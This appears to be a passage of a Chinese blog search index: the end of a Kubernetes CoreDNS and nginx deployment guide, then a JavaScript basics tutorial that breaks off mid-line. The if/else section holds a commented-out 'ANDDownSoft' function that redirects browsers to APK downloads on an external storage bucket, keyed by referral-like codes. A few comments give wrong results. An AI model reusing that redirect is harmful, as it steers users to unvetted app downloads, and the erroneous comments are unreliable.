services - pods - namespaces verbs: - list - watch - apiGroups: - discovery.k8s.io resources: - endpointslices verbs: - list - watch---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: system:corednsroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:corednssubjects:- kind: ServiceAccount name: coredns namespace: kube-system---apiVersion: v1kind: ConfigMapmetadata: name: coredns namespace: kube-systemdata: Corefile: | .:53 { errors health { lameduck 5s } ready kubernetes cluster.local in-addr.arpa ip6.arpa { fallthrough in-addr.arpa ip6.arpa } prometheus :9153 forward . /etc/resolv.conf { max_concurrent 1000 } cache 30 loop reload loadbalance }---apiVersion: apps/v1kind: Deploymentmetadata: name: coredns namespace: kube-system labels: k8s-app: kube-dns kubernetes.io/name: \"CoreDNS\"spec: # replicas: not specified here: # 1. Default is 1. # 2. Will be tuned in real time if DNS horizontal auto-scaling is turned on. strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 1 selector: matchLabels: k8s-app: kube-dns template: metadata: labels: k8s-app: kube-dns spec: priorityClassName: system-cluster-critical serviceAccountName: coredns tolerations: - key: \"CriticalAddonsOnly\" operator: \"Exists\" nodeSelector: kubernetes.io/os: linux affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: k8s-app operator: In values: [\"kube-dns\"] topologyKey: kubernetes.io/hostname containers: - name: coredns image: coredns/coredns:1.8.4 imagePullPolicy: IfNotPresent resources: limits: memory: 170Mi requests: cpu: 100m memory: 70Mi args: [ \"-conf\", \"/etc/coredns/Corefile\" ] volumeMounts: - name: config-volume mountPath: /etc/coredns readOnly: true ports: - containerPort: 53 name: dns protocol: UDP - containerPort: 53 name: dns-tcp protocol: TCP - containerPort: 9153 name: metrics protocol: TCP securityContext: allowPrivilegeEscalation: false capabilities: add: - NET_BIND_SERVICE drop: - all readOnlyRootFilesystem: true livenessProbe: httpGet: path: /health port: 8080 scheme: HTTP initialDelaySeconds: 60 timeoutSeconds: 5 successThreshold: 1 failureThreshold: 5 readinessProbe: httpGet: path: /ready port: 8181 scheme: HTTP dnsPolicy: Default volumes: - name: config-volume configMap: name: coredns items: - key: Corefile path: Corefile---apiVersion: v1kind: Servicemetadata: name: kube-dns namespace: kube-system annotations: prometheus.io/port: \"9153\" prometheus.io/scrape: \"true\" labels: k8s-app: kube-dns kubernetes.io/cluster-service: \"true\" kubernetes.io/name: \"CoreDNS\"spec: selector: k8s-app: kube-dns clusterIP: 10.96.0.2 ports: - name: dns port: 53 protocol: UDP - name: dns-tcp port: 53 protocol: TCP - name: metrics port: 9153 protocol: TCP EOF 1kubectl apply -f coredns.yaml 12345678# kubectl get pods -ANAMESPACE NAME READY STATUS RESTARTS AGEkube-system calico-kube-controllers-7cc8dd57d9-tf2m5 1/1 Running 0 4m7skube-system calico-node-llw5w 1/1 Running 0 4m7skube-system calico-node-mhh6g 1/1 Running 0 4m7skube-system calico-node-twj99 1/1 Running 0 4m7skube-system calico-node-zh6xl 1/1 Running 0 4m7skube-system coredns-675db8b7cc-ncnf6 1/1 Running 0 26s 这里可以测试coredns是否生效 1dig -t a www.baidu.com @10.96.0.2 2.5.11 部署应用验证1234567891011121314151617181920212223242526272829303132333435cat &gt; nginx.yaml &lt;&lt; \"EOF\"---apiVersion: v1kind: ReplicationControllermetadata: name: nginx-webspec: replicas: 2 selector: name: nginx template: metadata: labels: name: nginx spec: containers: - name: nginx image: nginx:1.19.6 ports: - containerPort: 80---apiVersion: v1kind: Servicemetadata: name: nginx-service-nodeportspec: ports: - port: 80 targetPort: 80 nodePort: 30001 protocol: TCP type: NodePort selector: name: nginxEOF 1kubectl apply -f nginx.yaml 1234# kubectl get pods -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATESnginx-web-2ghbj 1/1 Running 0 4m31s 10.244.194.65 k8s-worker1 &lt;none&gt; &lt;none&gt;nginx-web-dgdcx 1/1 Running 0 4m31s 10.244.224.1 k8s-master2 &lt;none&gt; &lt;none&gt; 123456789101112# kubectl get allNAME READY STATUS RESTARTS AGEpod/nginx-web-2ghbj 0/1 ContainerCreating 0 33spod/nginx-web-dgdcx 0/1 ContainerCreating 0 33sNAME DESIRED CURRENT READY AGEreplicationcontroller/nginx-web 2 2 0 33sNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/kubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 4h8mservice/nginx-service-nodeport NodePort 10.96.145.204 &lt;none&gt; 80:30001/TCP 33s[root@k8s-master1 k8s-work]#","link":"/2023/05/17/Kubernetes%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%83%A8%E7%BD%B2/"},{"title":"Javascript基础","text":"一,Javascript基础1，基础介绍1.html中添加js代码、注释方法、输出方式 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;html中添加js代码、注释方法、输出方式&lt;/title&gt; &lt;!-- 外部添加JS代码，src属性为外部js文件的路径(路径绝对路径或者相对路径) --&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;yichen.js&quot;&gt; &lt;!-- 此时在此处写JS代码有效 --&gt; console.log(&quot;测试是否有效&quot;) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 内部添加JS代码，使用script标签，不可以使用单标签 --&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 双斜杠注释单行 /* 可以注释多行 注意:多行注释不能嵌套使用 */ console.log(&quot;测试一下&quot;); //输出方式 //1，页面输出 document.write(&quot;yichen is a good man&quot;); //2,控制台输出 常用 console.log(&quot;yichen is a handsome man&quot;) //3,浏览器弹出框输出 alert(&quot;yichen is a nice man &quot;) &lt;/script&gt; &lt;!-- script标签可以有多个，按顺序执行.... --&gt; &lt;script type=&quot;text/javascript&quot;&gt; console.log(&quot;我在第二个script标签里&quot;); &lt;/script&gt; &lt;button type=&quot;button&quot;&gt;按钮&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 2，JavaScript的数据类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。引用数据类型：对象(Object)、数组(Array)、函数(Function)。注：Symbol 是 ES6 引入了一种新的原始数据类型，表示独一无二的值。JavaScript 拥有动态类型JavaScript 拥有动态类型。这意味着相同的变量可用作不同的类型：实例var x; // x 为 undefinedvar x = 5; // 现在 x 为数字var x = &quot;John&quot;; // 现在 x 为字符串1、JavaScript 字符串字符串是存储字符（比如 &quot;Bill Gates&quot;）的变量。字符串可以是引号中的任意文本。您可以使用单引号或双引号：实例var carname=&quot;Volvo XC60&quot;;var carname='Volvo XC60';您可以在字符串中使用引号，只要不匹配包围字符串的引号即可：实例var answer=&quot;It's alright&quot;;var answer=&quot;He is called 'Johnny'&quot;;var answer='He is called &quot;Johnny&quot;';您将在本教程的高级部分学到更多关于字符串的知识。2、JavaScript 数字JavaScript 只有一种数字类型。数字可以带小数点，也可以不带：实例var x1=34.00; //使用小数点来写var x2=34; //不使用小数点来写极大或极小的数字可以通过科学（指数）计数法来书写：实例var y=123e5; // 12300000var z=123e-5; // 0.00123您将在本教程的高级部分学到更多关于数字的知识。3、JavaScript 布尔布尔（逻辑）只能有两个值：true 或 false。var x=true;var y=false;布尔常用在条件测试中。您将在本教程稍后的章节中学到更多关于条件测试的知识。4、JavaScript 数组下面的代码创建名为 cars 的数组：var cars=new Array();cars[0]=&quot;Saab&quot;;cars[1]=&quot;Volvo&quot;;cars[2]=&quot;BMW&quot;;或者 (condensed array):var cars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);或者 (literal array):实例var cars=[&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;];数组下标是基于零的，所以第一个项目是 [0]，第二个是 [1]，以此类推。您将在本教程稍后的章节中学到更多关于数组的知识。4、JavaScript 对象对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：var person={firstname:&quot;John&quot;, lastname:&quot;Doe&quot;, id:5566};上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。空格和折行无关紧要。声明可横跨多行：var person={firstname : &quot;John&quot;,lastname : &quot;Doe&quot;,id : 5566};对象属性有两种寻址方式：实例name=person.lastname;name=person[&quot;lastname&quot;];您将在本教程稍后的章节中学到更多关于对象的知识。5、Undefined 和 NullUndefined 这个值表示变量不含有值。当我们试图访问一个不存在的变量时，就会得到一个特殊的值undefined,除此之外，使用已定义却未赋值的变量也会如此，以为js会自动将变量在初始化之前的值设定为undefined,而Undefined类型的值只有一个，那就是undefined.Null: 只包含一个值的特殊数据类型。所谓的Null值，通常是没有值或空值，不代表任何东西。null与undefined最大的不同在于，被赋予null的变量通常被认为是已经定义了的，只不过它不代表任何东西。可以通过将变量的值设置为 null 来清空变量。实例cars=null;person=null;声明变量类型当您声明新变量时，可以使用关键词 &quot;new&quot; 来声明其类型：var carname=new String;var x= new Number;var y= new Boolean;var cars= new Array;var person= new Object; JavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。 3，JavaScript 保留关键字在 JavaScript 中，一些标识符是保留关键字，不能用作变量名或函数名。 JavaScript 标准 所有的现代浏览器完全支持 ECMAScript 3（ES3，JavaScript 的第三版，从 1999 年开始）。 ECMAScript 4（ES4）未通过。 ECMAScript 5（ES5，2009 年发布），是 JavaScript 最新的官方版本。 随着时间的推移，我们开始看到，所有的现代浏览器已经完全支持 ES5。 JavaScript 保留关键字 Javascript 的保留关键字不可以用作变量、标签或者函数名。有些保留关键字是作为 Javascript 以后扩展使用。 abstract arguments boolean break byte case catch char class* const continue debugger default delete do double else enum* eval export* extends* false final finally float for function goto if implements import* in instanceof int interface let long native new null package private protected public return short static super* switch synchronized this throw throws transient true try typeof var void volatile while with yield * 标记的关键字是 ECMAScript5 中新添加的。 JavaScript 对象、属性和方法 您也应该避免使用 JavaScript 内置的对象、属性和方法的名称作为 Javascript 的变量或函数名： Array Date eval function hasOwnProperty Infinity isFinite isNaN isPrototypeOf length Math NaN name Number Object prototype String toString undefined valueOf Java 保留关键字 JavaScript 经常与 Java 一起使用。您应该避免使用一些 Java 对象和属性作为 JavaScript 标识符： getClass java JavaArray javaClass JavaObject JavaPackage 123456非标准 JavaScript除了保留关键字，在 JavaScript 实现中也有一些非标准的关键字。一个实例是 const 关键字，用于定义变量。 一些 JavaScript 引擎把 const 当作 var 的同义词。另一些引擎则把 const 当作只读变量的定义。Const 是 JavaScript 的扩展。JavaScript 引擎支持它用在 Firefox 和 Chrome 中。但是它并不是 JavaScript 标准 ES3 或 ES5 的组成部分。建议：不要使用它。 2，基础语句js基础.js文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394//console.log(&quot;我是在外边的js文件中&quot;)//console.log(&quot;&lt;h1&gt;yichen &lt;/h1&gt;&quot;)//alert(&quot;&lt;h1&gt;yichen&lt;/h1&gt;&quot;)document.write(&quot;&lt;h1&gt;yichen&lt;/h1&gt;&quot;);// var = variable var num;num =10;num =&quot;a&quot;//typeof() 查看num是什么类型console.log(typeof(num))var num1 = 10;var num2 = 10;var sum = num1 + num2;// + 或者toString() 表示把数字转成字符串console.log(&quot;sum = &quot; + sum.toString())//Infinity 表示超过了js能表示的数字范围，就用Infinity表示var num3 = Infinity//NaN表示这个数字不是数字，但是它的值是数字类型,只不过是一种特殊的数字罢了var num4 = NaNconsole.log(typeof(NaN))//如果我们在算术运算中使用了不恰当的操作数，导致运算失败，就会得到NaNconsole.log(10 * 'f');//NaN具有传染性，只要算术运算中存在一个NaN,整个运算就会失败console.log(1 + 2 + NaN )console.log(NaN == NaN) //结果是falsevar num5 = 1e309console.log(num5)console.log(Infinity - Infinity)//判断NaN 是不是NaN console.log(isNaN(NaN))var str = &quot;yichen is a good man &quot;;//打印console.log(str);console.log(typeof(str));var arr = &quot;!&quot;// 两个字符串相加，相当于拼接var ret =str + arr;console.log(ret);/*flasy值常用于判断1、数字: 0.02、数字: 03、数字: NaN4、空字符串: &quot;&quot;5、布尔值: false6、undefined7、null*///其他类型转为数字var a = &quot;12+3&quot;var num =parseInt(a)console.log(num)console.log(typeof(num))//1、null --&gt;Numberconsole.log(Number(null))//0//2、undefined--&gt; Numberconsole.log(Number(undefined))//NaN//3、Boolean--&gt;Numberconsole.log(Number(true))//1console.log(Number(false));//0//4、String--&gt;Number//如果字符串中只有数字、小数点、(最前面空格 正负号)则转换成对应的十进制数console.log(Number(&quot;123&quot;));//123console.log(Number(&quot;12.3&quot;));//12.3console.log(Number(&quot;+123&quot;));//-123console.log(Number(&quot;-123&quot;));//-123console.log(Number(&quot; 123&quot;))//123//如果是一个空字符串，结果是0console.log(Number(&quot;&quot;));//0console.log(Number(&quot; &quot;))//0//parseInt()/*功能:会试图将其收到的任何输入值(通常是字符串)转成整数类型，如果转换失败就返回NaN转换规则: 如果第一个非空白字符(空格、换行、tab) 是数字或者正负号则开始转换。直到碰到第一个非数字字符停止转换。如果第一个非空白字符不是数字或者正负号，转换失败。结果是NaN. */console.log(parseInt(&quot;123&quot;))//123console.log(parseInt(&quot;+123&quot;))//123console.log(parseInt(&quot;-123&quot;))//-123console.log(parseInt(&quot; 123&quot;))//123console.log(parseInt(&quot;12a3&quot;))//12console.log(parseInt(&quot;12.3&quot;))//12console.log(parseInt(&quot;12 3&quot;))//12//NaNconsole.log(parseInt(&quot;true&quot;));console.log(parseInt(&quot; .123&quot;));console.log(parseInt(&quot;+-123&quot;));/*parseFloat()功能: 会试图将其收到的任何 输入值(通常是字符串)转成浮点数类型，如果转换失败就返回NaN*/console.log(parseFloat(&quot; 2.5a&quot;))//2.5console.log(parseFloat(&quot; .56&quot;)) //0.56console.log(parseFloat(&quot; -.23&quot;))//- 0.23console.log(parseFloat(&quot; +.23 + .1&quot;))//0.23console.log(parseFloat(&quot; 3.14.956&quot;))//3.14console.log(parseFloat(&quot;a3.14&quot;)); //NaN //prompt()输入var num =parseInt((&quot;请输入 &quot;))console.log(num)console.log(typeof(num))//运算var num1 = 10var num2 = 3console.log(num1 /num2)//1、任何数字与NaN进行运算结果都是NaN //2、Infinity+(-Infinity) = NaN;//3、 Boolean/undefined/null + Number//先转换成Number类型，然后进行算术运算console.log(num1 + null) // 10//4、String+(number/Boolean/undeined/null)//+相当于是字符串的拼接符console.log(&quot;str&quot;+ num1);var num1 = 10;var num2 = 10;num1 ++;console.log(num1)++num2;console.log(num2)/*自增运算符 ++自增运算符表达式 ++变量 变量++功能: a++,++a都是自增运算表达式，功能都是将a的值加1值:a++称为加前取值，先取值再增加，表达式的值是a增加之前的值。++a称为加后取值，先增加后取值，表达式的值是a加后的值。*/var a =1;var b;b = a++;console.log(a); //2console.log(b);//1var c = ++b;console.log(c);//2/*复合运算符 += -= *= /= %=a +=1 == a = a + 1*/var a = 1;a += 1;console.log(a) ;//2/** * if语句 * 格式: * if (表达式) * { 语句 } * 逻辑: 当程序执行到if语句时，首先计算&quot;表达式&quot;的值，如果表达式的值为真，那么 * 就执行if下面大括号的语句，如果表达式的值为假，则跳过整个if语句继续向下执行。 * falsthy值为假 * */// if (1) {// console.log(&quot;*********&quot;);// }// var num = parseInt(prompt())// if (num % 2 == 0){// console.log(&quot;偶数&quot;) // } else {// console.log(&quot;奇数&quot;)// }/** * 格式 * if (表达式) * { 语句1 } else { 语句2 } 逻辑: 当程序执行到if-else语句时，首先计算表达式的值，如果表达式的值为真，那么执行语句1，执行完语句1则跳过整个if-else语句 继续向下执行，如果表达式的值为假，那么执行语句2，执行完语句2则跳过整个if-else语句继续向下执行。 *//** * if (表达式1) { 语句1 } else if (表达式2) { 语句2 } else if (表达式3){ 语句3 } else { 语句n } */ // function ANDDownSoft() { // if(c == null) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/app_vtgg_2.7.0.apk&quot;; // } else if (c == &quot;9PVHH&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/9PVHjH.apk&quot;; // } else if (c == &quot;QS3KC&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/QSh3KC.apk&quot;; // } else if (c == &quot;ZY4SX&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/ZYk4SX.apk&quot;; // } else if (c == &quot;ZEUN1&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/ZEUkN1.apk&quot;; // } else if (c == &quot;FRM2V&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/FRM2nV.apk&quot;; // } else if (c == &quot;RQPOC&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/RQPfOC.apk&quot;; // } else if (c == &quot;8NMJ4&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/8NMbJ4.apk&quot;; // } else if (c == &quot;LUWC0&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/LUWCn0.apk&quot;; // } else if (c == &quot;6IN0K&quot;) { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/6INm0K.apk&quot;; // } else { // window.location.href = &quot;https://cq-ht.oss-cn-hongkong.aliyuncs.com/app_vtgg_2.7.0.apk&quot;; // } // }//上面是示列console.log(1==1)console.log(1 == &quot;1&quot;)//值为1就是tureconsole.log(1 ===&quot;1&quot;);//绝对等于，值相等，类型也要相等console.log(1 !==&quot;1&quot;);//绝对不相等//三目运算//?://表达式? 表达式1 : 表达式2//功能: 如果表达式的值为真，则计算表达式1的值，如果表达式的值为假，则计算表达式2的值//如果表达是的值为真，则三目运算表达式的值为表达式1 的值，否则为表达式2的值console.log(1? 2: 3)//2var a=0? 2: 3;console.log(a) //3/** * 逻辑与 &amp;&amp; and * 逻辑或 || or * 逻辑非 ! not * * 逻辑与 必须表达式1和表达式2都为真，结果才是真 * 逻辑或 其中有一个是真，就是真 * 逻辑非，颠倒黑白 * 逻辑非运算表达式 ! 表达式 * 值: * 如果表达式的只为真，则逻辑非的运算表达式的值为假。反之为真。 * *//*switch (表达式) { case 标号1: 语句1 case 标号2: 语句2 case 标号3: 语句3 default: 语句f}*///var num = parseInt(prompt())// switch (num) {// case 1:// console.log(&quot;星期1&quot;)// break;// case 2:// console.log(&quot;星期2&quot;)// break;// case 3:// console.log(&quot;星期3&quot;)// break;// case 4:// console.log(&quot;星期4&quot;)// break;// case 5:// console.log(&quot;星期5&quot;)// break;// case 6:// console.log(&quot;星期6&quot;)// break;// case 7:// console.log(&quot;星期天&quot;)// default:// console.log(&quot;输入有误&quot;)// }//break语句:专门用来跳出switch语句和循环语句；/*while (表达式){ 语句}*///1+2+...+10的和var num = 1;var sum = 0;while (num &lt;=10) { sum += num; num++;}console.log(&quot;sum =&quot; + sum); /* do{ 语句 }while (表达式) */var sum = 0var num = 1;do { sum += num; num++;} while (num &lt;=10)console.log(sum)/** * for语句 * 格式 (语句1; 表达式; 语句3) { 语句2； } 逻辑: 当程序执行到for语句时，首先执行语句1(仅仅会执行一次)。执行完语句1，计算表达式的值。如果表达式的值为假，则跳过整个for语句。 如果表达式的值为真，则执行语句2.执行完语句2再去执行语句3，执行完语句3再去计算表达式的值，如此循环往复，直到表达式的值的值为假才 停止。 *///1+2+...+10var sum = 0;for (var i = 1;i&lt;=10; i++){ sum += i }console.log(sum)/*for-in语句for-in语句:往往用来遍历某个数组或对象中元素*/var arr= [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;];for (var i in arr){ console.log(&quot;index:&quot; + i +&quot; value:&quot; + arr[i]); } 3，js函数1,函数的概述12345678910111213141516171819202122232425262728293031323334353637383940/*认识函数: 在一个完整的项目中，某些功能会被反复使用，那么会将某段代码封装成函数，当我们要使用功能的时候直接调用函数即可。注意:函数是对功能的封装优点:1、简化代码结构，增加代码的复用度(重复使用的程度)2、如果想修改或调试某一功能时，只需修改对应的函数即可*//*函数概述(函数的声明):function 函数名(参数列表){ 语句 return 表达式 }1、function: 是函数的关键词2、函数名: 遵循标识符的规则3、(): 参数列表的开始和结束4、参数列表: 函数从函数的调用者获得的信息，可以没有参数5、{}: 函数体的开始和结束6、语句: 函数封装的功能7、 return 表达式: return 一般用于结束函数，并返回给函数的调用者一些信息，&quot;表达式&quot;即为要返回的数据。如果一个函数没有显示的返回return子句，我们就默认它的返回值为undefined。注意: 在仅仅只声明之后是不会被执行的，只是说明有了一个能完成该功能的函数，还没有被使用*//*函数在声明之后就可以被使用了函数的调用: 函数名(参数列表); 函数名: 即要使用某个功能函数的名字参数列表: 函数的调用者给函数传递的信息*/ 2，最简单的函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172 /*编写函数，实现在控制台上打印&quot;yichen is a good man!&quot; 的功能*///函数的调用,可以写在函数声明之前或之后myConsole();//函数的声明function myConsole() { console.log(&quot;yichen is a good man!&quot;);}//函数的再次调用myConsole(); /* 编写函数，给函数一个字符串，函数内部在控制台上打印出来。 *//*多个参数之间用逗号分隔此时的str、age可以称为形式参数(形参)，本质是变量*/function myConsole1(str, age) { console.log(str, &quot;he is &quot; + age); }/*此时()中的参数可以称为实际参数(实参)，本质是值函数的调用过程本质就是实参给形参赋值的过程*/myConsole1(&quot;yichen is a nice man!&quot;, 18);//对于已经传进来的参数js是来者不拒的，但是多余的部分会被默默的忽略掉myConsole1(&quot;yichen is a cool man!&quot;, 20 ,&quot;nice&quot;, &quot;handsome&quot;);//arguments 后期讲解/* 编写函数，给函数一个字符串，函数内部在控制台上打印出来。 *//*多个参数之间用逗号分隔此时的str、age可以称为形式参数(形参)，本质是变量*/function myConsole1(str, age) { console.log(str, &quot;he is &quot; + age); //使用下面的方法可以将多余的值打印出来 for (var i = 0; i&lt; arguments.length; i++){ console.log(arguments[i]) }}/*此时()中的参数可以称为实际参数(实参)，本质是值函数的调用过程本质就是实参给形参赋值的过程*/myConsole1(&quot;yichen is a nice man!&quot;, 18);//对于已经传进来的参数js是来者不拒的，但是多余的部分会被默默的忽略掉myConsole1(&quot;yichen is a cool man!&quot;, 20 ,&quot;nice&quot;, &quot;handsome&quot;,&quot;very&quot;);//arguments 类似于数组的对象，但是它不是数组 3，变量提升、匿名，即时函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function func(){ //变量提升 //var num console.log(num) //undefined var num = 20 console.log(num) //声明一个变量时没有使用var语句时，该变量就会默认为全局的 num3 = 30; }func()console.log(num3)//函数名也是数据，我们可以把一个函数赋值给一个变量，在通过变量访问函数。var a = funca()//匿名函数var f = function(a){ console.log(&quot;a= &quot; + a);}f(123);/*通过这种方式定义的函数被称为匿名函数(即没有名字的函数),特别是当他不被赋值给变量单独使用时，可以有两种优雅的用法。1、可以将匿名函数作为参数传递给其他函数2、定义匿名函数完成某些一次性任务*/function fun(num1 , num2, fc){ return fc(num1 ,num2);}var num = fun(1,2,function(a,b){ return a + b;});console.log(&quot;num = &quot; +num);//即时函数/* 即时函数:这种函数可以在定以后立即调用将匿名函数的定义放进一对小括号中，然后外面再紧跟一对小括号即可，最后的小括号起到的是立即执行的作用，同时它也是向匿名函数传递参数的地方格式:先输入一对小括号()(),然后再第一个小括号定义匿名函数(function(参数列表){ 代码块})(实参)*/(function(str){ console.log(str)})(&quot;yichen is good &quot;) 4,js数组和常用方法认识数组//存储5个人的年龄，求他们的平均年龄var age1 = 18;var age2 = 19;var age3 = 20;var age4 = 22;var age5 = 23;var averageAge = (age1 + age2 + age3 + age4 + age5 ) / 5;console.log(&quot;averageAge = &quot; + averageAge);//思考:如果要保存100个人的年龄求他们的平均值，难道要定义100个变量吗??//此时我们就需要数组了/*内置对象就是指的这个语言自带的一些对象，供开发者使用，这些对象提供了一些常用的或是最基本而必要的功能浏览器上面跑的js的内置对象有Math,String,Array,Date等对象: 包含属性和方法(函数)数组: 就是对象可以存储多个不同类型的数据*/var arr = [1,2,3,4,5]console.log(arr[0])// 数组的遍历for (var i= 0;i &lt; arr.length; i++){ //python 里面%s 通过后面赋值需要加个%号，这个不需要加，加个,号就可以了。()括号也不需要加。 console.log(&quot;arr[%s] = %d&quot;, i, arr[i])}for (var i in arr) { console.log(&quot;arr[%s] = %d&quot;,i ,arr[i]) }//forEach()遍历数组，是ECMAScript5.0中加入的，在低版本中的IE中无法使用//forEach()中不能使用break和continuearr.forEach(function(e){ console.log(e)})//创建数组两种方法/*1、构造函数法1.1、使用构造函数创建一个空数组new 开辟空间并返回内存空间的引用*/var arr1 = new Array();console.log(arr1);//1.2 使用构造函数创建一个容量为20的数组var arr2 = new Array(20);console.log(arr2);//1.3、使用构造函数方法创建一个包含三个元素的数组var arr3 = new Array(&quot;a&quot;,&quot;b&quot;, 1)console.log(&quot;arr3&quot;)var arr = new Array(1,2,3,&quot;sfe&quot;)console.log(arr)var arr = new Array(5)arr[0] = 1;arr[1] = 2;arr[2] = 3;arr[3] = 4;arr[4] = 5;arr[5] = 6;console.log(arr)//2、数组字面量表示法,(相当于python的列表)//2.1、通过字面量创建空数组var arr4 = [];console.log(arr4);//2.2、通过字面量创建一个包含三个元素的数组var arr5 = [1,3,&quot;abc&quot;];console.log(arr5)//数组的访问//直接取值对应的下标就可以了。下标从0开始//数组的长度length、元素的更新、增加和删除lengthvar arr = [1,2,3,4];//打印数组的长度(元素个数)//注意:不计算非下标类的属性名console.log(&quot;数组arr长度: &quot; + arr.length);//改变数组的长度(增加)//其余元素默认值为undefinedarr.length = 10;console.log(arr);console.log(&quot;arr[4] = &quot; + arr[4]);console.log(&quot;arr[5] = &quot; + arr[5]);console.log(&quot;arr[6] = &quot; + arr[6]);console.log(&quot;arr[7] = &quot; + arr[7]);console.log(&quot;arr[8] = &quot; + arr[8]);//改变数组的长度(减少)//多余的直接裁剪arr.length=2;console.log(arr);//通过索引一个之前不存在的位置来添加元素arr[2] = 5;console.log(arr.length);console.log(arr);//如果新元素添加的位置与原数组末端存在一定的间隔，那么//这之间的元素将会被自动设置为undefined值arr[5] = 10console.log(arr.length);//6console.log(arr);console.log(&quot;arr[3] = &quot; + arr[3]);console.log(&quot;arr[4] = &quot; + arr[4]);/*删除: 用delete 操作符删除特定的元素原数组长度不会改变删除元素的位置只是被留空了而已，为undefined值*/delete arr[2];console.log(arr.length); //6console.log(arr);console.log(&quot;arr[2] = &quot; + arr[2]);//数组的常用方法/*1、push(item1,item2....)功能:向数组的末尾插入元素参数: 一个或多个数组元素返回值: 数组改变之后的容量*/var arr1 = [1,2,3];var length1 = arr1.push(4,5)console.log(&quot;length1 = &quot; + length1) //5console.log(arr1); //[1,2,3,4,5]/*2、unshift(item1,item2....)功能:向数组的头部插入元素参数: 一个或多个数组元素返回值:数组改变之后的容量*/var arr2 = [1,2,3];var length2 = arr2.unshift(-1,0);console.log(&quot;length2 = &quot; + length2) //5console.log(arr2); //[-1,0,1,2,3]/* 3、pop()功能:删除数组末尾的元素参数: 无参返回值: 删除的元素*/var arr3 = [1,2,3];var value3 = arr3.pop();console.log(&quot;value3 = &quot; + value3)console.log(arr3)/*4、shift()功能: 删除数组头部的元素参数: 无参返回值: 删除的元素*/var arr4 = [1,2,3];var value4 = arr4.shift();console.log(&quot;value4 = &quot; + value4);console.log(arr4);/* 5、join(str)功能: 用参数字符串将数组中的元素拼接成一个新的字符串参数: 拼接使用的字符串返回值: 拼接后的字符串不会改变原数组*/var arr5 = [1,2,3,4];var str5 = arr5.join(&quot;good&quot;);console.log(arr5);//(4) [1, 2, 3, 4]console.log(str5);//1good2good3good4/* 6、reverse()功能: 将原数组元素倒置参数: 无返回值: 返回原数组注意:原数组改变*/var arr6 = [1,2,3,4]var ret6 = arr6.reverse();console.log(arr6);//[4, 3, 2, 1]console.log(ret6);//[4, 3, 2, 1]/* 7、slice(startIndex,endIndex)功能: 截取数组元素参数: 开始下标，结束下标返回值: 截取到的数组元素组成的数组注意:1. 不包括arr[enIndex]元素，和python一样2. 原数组不会改变3. enIndex的值必须大于1并且不能小于startIndex的值*/var arr7 = [1,2,3,4,5,6,7,8];var ret7 = arr7.slice(0,6);console.log(&quot;***********&quot;)console.log(ret7);//[1, 2, 3, 4, 5, 6]console.log(arr7);// [1, 2, 3, 4, 5, 6, 7, 8]/* 8、splice(下标，个数，item1,item2....)必须的参数: 下标，个数可选的参数: item1,item2...功能: 在数组中间插入或者删除数组元素，如果要插入元素的话，个数为0返回值: 被删除的元素组成的数组*///splice插入方式var arr8 = [1,2,3,4,5];var ret8 = 